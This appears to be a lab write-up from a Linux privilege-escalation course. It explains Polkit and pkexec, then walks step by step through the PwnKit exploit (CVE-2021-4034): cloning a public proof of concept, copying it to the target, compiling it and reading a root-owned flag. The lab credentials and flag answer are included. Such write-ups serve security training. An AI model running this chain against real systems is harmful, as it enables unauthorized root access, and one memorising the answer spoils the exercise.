# Polkit
PolicyKit (`polkit`) is an authorization service on Linux-based operating systems that allows user software and system components to communicate with each other if the user software is authorized to do so.\

Polkit works with two groups of files.

1. actions/policies (`/usr/share/polkit-1/actions`)
2. rules (`/usr/share/polkit-1/rules.d`)

Polkit also has `local authority` rules which can be used to set or remove additional permissions for users and groups. Custom rules can be placed in the directory `/etc/polkit-1/localauthority/50-local.d` with the file extension `.pkla`.

PolKit also comes with three additional programs:

- `pkexec` - runs a program with the rights of another user or with root rights
- `pkaction` - can be used to display actions
- `pkcheck` - this can be used to check if a process is authorized for a specific action

The most interesting tool for us, in this case, is `pkexec` because it performs the same task as `sudo` and can run a program with the rights of another user or root.

```sh
# pkexec -u <user> <command>
$ pkexec -u root id

uid=0(root) gid=0(root) groups=0(root)
```

In the pkexec tool, the memory corruption vulnerability with the identifier [CVE-2021-4034](https://github.com/arthepsy/CVE-2021-4034) was found, also known as Pwnkit and also leads to privilege escalation. 

```sh
$ git clone https://github.com/arthepsy/CVE-2021-4034.git
$ cd CVE-2021-4034
$ gcc cve-2021-4034-poc.c -o poc
$ ./poc

# id

uid=0(root) gid=0(root) groups=0(root)
```

## Questions
SSH to 10.129.205.113 (ACADEMY-LLPE-POLKIT), with user `htb-student` and password `HTB_@cademy_stdnt!`
1. Escalate the privileges and submit the contents of flag.txt as the answer. **Answer: HTB{p0Lk1tt3n}**
   - Polkit is running a version that is vulnerable to CVE-2021-4034:
        ```sh
        $ pkexec --version
        pkexec version 0.105
        ```
   - Download the PoC and deliver it to the victim:
        ```sh
        $ git clone https://github.com/arthepsy/CVE-2021-4034
        Cloning into 'CVE-2021-4034'...
        remote: Enumerating objects: 18, done.
        remote: Counting objects: 100% (4/4), done.
        remote: Compressing objects: 100% (4/4), done.
        remote: Total 18 (delta 2), reused 0 (delta 0), pack-reused 14 (from 1)
        Receiving objects: 100% (18/18), 4.79 KiB | 4.79 MiB/s, done.
        Resolving deltas: 100% (3/3), done.
        $ cd CVE-2021-4034/
        $ scp cve-2021-4034-poc.c htb-student@10.129.205.113:/tmp
        htb-student@10.129.205.113's password: 
        cve-2021-4034-poc.c                           100% 1267     8.0KB/s   00:00
        ```
   - Compile the PoC at victim and execute it to gain root and read the flag:
        ```sh
        $ gcc cve-2021-4034-poc.c -o poc
        $ ./poc
        # id
        uid=0(root) gid=0(root) groups=0(root),1001(htb-student)
        # cat /root/flag.txt
        HTB{p0Lk1tt3n}
        ```